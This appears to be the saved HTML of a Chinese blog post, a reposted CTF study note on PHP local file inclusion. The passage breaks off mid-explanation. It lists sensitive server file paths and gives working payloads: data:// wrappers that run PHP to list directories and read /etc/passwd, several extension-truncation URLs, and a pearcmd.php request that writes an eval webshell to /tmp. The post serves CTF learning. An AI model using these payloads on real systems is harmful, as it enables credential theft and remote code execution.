@@ -1,0 +1,760 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    文件包含小tip |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="转载自ctf文件包含总结 - 杂谈小记 | Clear Mind &#x3D; P1kap1 &#x3D; 东隅已逝，桑榆非晚  Data伪协议 123456789101112data:,&lt;文本数据&gt;  data:text&#x2F;plain,&lt;文本数据&gt;  data:text&#x2F;html,&lt;HTML代码&gt;  data:text&#x2F;html;base64,&lt;base64编码的HTML代码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含小tip">
+<meta property="og:url" content="http://example.com/2025/05/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8Ftip/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="转载自ctf文件包含总结 - 杂谈小记 | Clear Mind &#x3D; P1kap1 &#x3D; 东隅已逝，桑榆非晚  Data伪协议 123456789101112data:,&lt;文本数据&gt;  data:text&#x2F;plain,&lt;文本数据&gt;  data:text&#x2F;html,&lt;HTML代码&gt;  data:text&#x2F;html;base64,&lt;base64编码的HTML代码">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-05-08T07:26:17.000Z">
+<meta property="article:modified_time" content="2025-09-18T03:00:23.328Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/1737907114de8a.jpg" alt="文件包含小tip">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">文件包含小tip</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text"> Data伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.</span> <span class="toc-text"> 本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">2.1.</span> <span class="toc-text"> 敏感文件路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text"> 伪协议读文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#00-%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.1.</span> <span class="toc-text"> %00 截断文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 路径长度截断文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.3.</span> <span class="toc-text"> 点号截断文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABpearcmdphp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%86%99%E5%85%A5shell"><span class="toc-number">2.3.</span> <span class="toc-text"> 裸文件包含(pearcmd.php文件包含写入shell)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 例题：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.</span> <span class="toc-text"> 日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 中间件日志文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="toc-number">2.4.1.1.</span> <span class="toc-text"> 例题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.2.</span> <span class="toc-text"> ssh 日志文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.5.</span> <span class="toc-text"> session 文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.6.</span> <span class="toc-text"> 临时文件包含</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-文件包含小tip" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/05/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8Ftip/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-08T07:26:17.000Z" itemprop="datePublished">2025-05-08</time>
+    <time style="display: none;" id="post-update-time">2025-09-18</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>转载自<a target="_blank" rel="noopener" href="https://p1kap1.github.io/knowledge/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">ctf文件包含总结 - 杂谈小记 | Clear Mind = P1kap1 = 东隅已逝，桑榆非晚</a></p>
+<h2 id="data伪协议"><a class="markdownIt-Anchor" href="#data伪协议"></a> Data伪协议</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data:,&lt;文本数据&gt;  </span><br><span class="line">data:text/plain,&lt;文本数据&gt;  </span><br><span class="line">data:text/html,&lt;HTML代码&gt;  </span><br><span class="line">data:text/html;base64,&lt;base64编码的HTML代码&gt;  </span><br><span class="line">data:text/css,&lt;CSS代码&gt;  </span><br><span class="line">data:text/css;base64,&lt;base64编码的CSS代码&gt;  </span><br><span class="line">data:text/javascript,&lt;Javascript代码&gt;  </span><br><span class="line">data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;  </span><br><span class="line">data:image/gif;base64,base64编码的gif图片数据  </span><br><span class="line">data:image/png;base64,base64编码的png图片数据  </span><br><span class="line">data:image/jpeg;base64,base64编码的jpeg图片数据  </span><br><span class="line">data:image/x-icon;base64,base64编码的icon图片数据</span><br></pre></td></tr></table></figure>
+<h2 id="本地文件包含"><a class="markdownIt-Anchor" href="#本地文件包含"></a> 本地文件包含</h2>
+<p>本地文件包含就是通过浏览器包含 web 服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行。</p>
+<h3 id="敏感文件路径"><a class="markdownIt-Anchor" href="#敏感文件路径"></a> 敏感文件路径</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">日志路径</span><br><span class="line">/logs/access.log     #windows apache</span><br><span class="line">/logs/error.log      #windows apache</span><br><span class="line">/var/log/apache/error.log     #Apache</span><br><span class="line">/var/log/apache/access_log   #Apache</span><br><span class="line">/var/www/logs/access_log    #Apache</span><br><span class="line">/var/log/asscess_log       #Apache</span><br><span class="line">/var/log/access.log       #Apache</span><br><span class="line">/usr/local/apache/logs/error_log</span><br><span class="line">/usr/local/apache/logs/access_log</span><br><span class="line">/etc/httpd/logs/access_log    #Apache</span><br><span class="line">/var/log/nginx/access.log或者error.log   #Nginx</span><br><span class="line">/logs/access.log或者error.log     #windows Nginx</span><br><span class="line">C:\windows\system32\LogFiles   #iis6.0版本</span><br><span class="line">%SystemDrive%\inetpub\logs\LogFiles #iis7.5版本</span><br><span class="line"></span><br><span class="line">session 路径</span><br><span class="line">/tmp/sess_phpsession_id</span><br><span class="line"></span><br><span class="line">敏感信息路径</span><br><span class="line">windows</span><br><span class="line">c:\boot.ini  #查看系统版本</span><br><span class="line">c:\Windows\System32\inetsrv\MetaBase.xml #IIS配置文件</span><br><span class="line">c:\Windows\repair\sam  #存储系统初次安装密码</span><br><span class="line">c:\Windows\php.ini  #php配置信息</span><br><span class="line">c:\Windows\my.ini  #mysql配置信息</span><br><span class="line">c:\Program Files\mysql\my.ini</span><br><span class="line">c:\Program Files\mysql\data\mysql\user.MYD #mysql root</span><br><span class="line">phpstudy的各种路径具体分析</span><br><span class="line"></span><br><span class="line">linux</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.keystore</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">/etc/passwd                #账户信息</span><br><span class="line">/etc/shadow                #账户密码信息</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/root/httpd/conf/httpd.conf</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/proc/self/fd/fd[0-9]*</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/config.gz</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf #Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf #虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini     #PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf          #Apache配置文件</span><br><span class="line">/proc/self/cmdline</span><br><span class="line">/proc/self/environ</span><br><span class="line">/etc/apache2/apache2.conf        #ubuntu 下配置文件</span><br><span class="line">/etc/my.conf                     # MySQL 配置文件</span><br><span class="line">/etc/nginx/nginx.conf            #Nginx配置文件</span><br></pre></td></tr></table></figure>
+<h3 id="伪协议读文件"><a class="markdownIt-Anchor" href="#伪协议读文件"></a> 伪协议读文件</h3>
+<p><strong>data伪协议：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $_GET[&#x27;file&#x27;];</span><br></pre></td></tr></table></figure>
+<p>读目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data:text/plain,&lt;?php print_r(glob(&#x27;/*&#x27;));?&gt;</span><br></pre></td></tr></table></figure>
+<p>读文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data:text/plain,&lt;?php print_r(file(&#x27;/etc/pas&#x27;));?&gt;</span><br></pre></td></tr></table></figure>
+<p>php://filter，直接看php:filter那篇</p>
+<p>常见的过滤绕过方式有三种：</p>
+<p>%00 截断文件包含 路径长度截断包含 点好截断文件包含</p>
+<h4 id="00-截断文件包含"><a class="markdownIt-Anchor" href="#00-截断文件包含"></a> %00 截断文件包含</h4>
+<p>利用条件 :</p>
+<p>这个漏洞的使用必须满足如下条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc=off </span><br><span class="line"></span><br><span class="line">PHP 版本低于 5.3.4 </span><br></pre></td></tr></table></figure>
+<p>输入以下测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.abc.com/xxx/file.php?file=../../../../../../boot.ini%00</span><br></pre></td></tr></table></figure>
+<p>通过 %00 截断了后面的 html 拓展名过滤，成功读取了 boot.ini 的内容</p>
+<h4 id="路径长度截断文件包含"><a class="markdownIt-Anchor" href="#路径长度截断文件包含"></a> 路径长度截断文件包含</h4>
+<p>操作系统存在着最大路径长度的限制。可以输入超过最大路劲长度的目录，这样系统就会将后面的路劲丢弃，导致拓展名截断。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞利用条件</span><br><span class="line"></span><br><span class="line">Windows 下最大路径长度为 256B</span><br><span class="line">Linux 下最大路径长度为 4096B</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">	include ($file.&quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输入测试以下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.abc.com/xxx/file.php?file=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ </span><br></pre></td></tr></table></figure>
+<p>执行后发现已经成功截断了后面的拓展名</p>
+<h4 id="点号截断文件包含"><a class="markdownIt-Anchor" href="#点号截断文件包含"></a> 点号截断文件包含</h4>
+<p>漏洞利用条件 点号截断包含只使用与 Windows 系统，点号的长度大于 256B 的时候，就可以造成拓展名截断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">	include ($file.&quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.abc.com/xxx/file.php?file=test.txt.........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>
+<p>发现已经成功截断了 html 拓展名</p>
+<h3 id="裸文件包含pearcmdphp文件包含写入shell"><a class="markdownIt-Anchor" href="#裸文件包含pearcmdphp文件包含写入shell"></a> 裸文件包含(pearcmd.php文件包含写入shell)</h3>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ForBreeze/p/17986029">利用pearcmd.php本地文件包含（LFI） - AllFalls - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62422842/article/details/126772725?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126772725-blog-121042290.235%5Ev38%5Epc_relevant_anti_t3_base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126772725-blog-121042290.235%5Ev38%5Epc_relevant_anti_t3_base&amp;utm_relevant_index=2">利用pearcmd.php文件包含拿shell（LFI）_pearcmd文件包含-CSDN博客</a></p>
+<h4 id="利用条件"><a class="markdownIt-Anchor" href="#利用条件"></a> 利用条件</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 安装了 pear 扩展（pear 就是一个 php 扩展及应用的代码仓库，没有安装 pear 扩展的话就没有 pear.php 文件可以利用了，pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl/pear 是默认安装的；在 7.4 及以后，需要我们在编译 PHP 的时候指定 --with-pear 才会安装。）</span><br><span class="line"></span><br><span class="line">2. 知道 pearcmd.php 文件的路径（默认路径是 /usr/local/lib/php/pearcmd.php）</span><br><span class="line"></span><br><span class="line">3. 开启了 register_argc_argv 选项（只有开启了，$_SERVER [‘argv’] 才会生效。）</span><br><span class="line"></span><br><span class="line">4. 有包含点，并且能包含 php 后缀的文件，而且没有 open_basedir 的限制。</span><br></pre></td></tr></table></figure>
+<h4 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题：</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    if(isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">        $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">        </span><br><span class="line">        if(preg_match(&#x27;/flag|log|session|filter|input|data/i&#x27;, $file)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        include($file.&quot;.php&quot;);</span><br><span class="line">        # Something in phpinfo.php!</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>题目过滤了常见的伪协议，然后提示说在 phpinfo.php 文件中有东西？file=phpinfo 看到一串敏感信息： fake 然后检查 register_argc_argv 发现都是 on。 结合标题，pear 很明显是 pear 裸文件包含。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php</span><br></pre></td></tr></table></figure>
+<p>简单解释一下： 首先得知道 $_SERVER [‘argv’] 通过 query_string 取值，并通过 + 作为分割符， 然后就是 config-create，阅读其代码和帮助，可以知道，它可以直接创建配置文件，这个命令需要传入两个参数，且第一个参数必须以 / 开头，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。 这里的：/&amp;file=/usr/local/lib/php/pearcmd&amp;/ 就是第一个参数，由于 php 会将格式错误的代码忽视，所以这句话即起到将 /usr/local/lib/php/pearcmd 包含的作用，又写入了一句话木马文件的内容， 所以也可以这样写：</p>
